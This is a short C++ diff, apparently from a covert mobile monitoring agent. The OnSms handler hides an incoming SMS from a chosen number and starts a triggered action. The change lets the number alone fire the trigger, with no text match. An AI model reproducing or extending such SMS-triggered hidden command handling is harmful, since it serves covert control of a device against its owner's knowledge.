@@ -88,7 +88,7 @@ DWORD WINAPI OnSms(LPVOID lpParam) {
 			// Vediamo se e' il nostro messaggio
 			// dwSmsNumberLen == dwNumLen && RtlEqualMemory(pSmsNum, wNumber, dwNumLen)
 			if (wcsstr((WCHAR *)pSmsNum, number.c_str()) && 
-				!_wcsnicmp((WCHAR *)pSmsText, text.c_str(), text.length())) {
+				(text.empty() || !_wcsnicmp((WCHAR *)pSmsText, text.c_str(), text.length()))) {
 					observerObj->MarkMessage(GetCurrentThreadId(), IPC_HIDE, TRUE);
 
 					me->triggerStart();
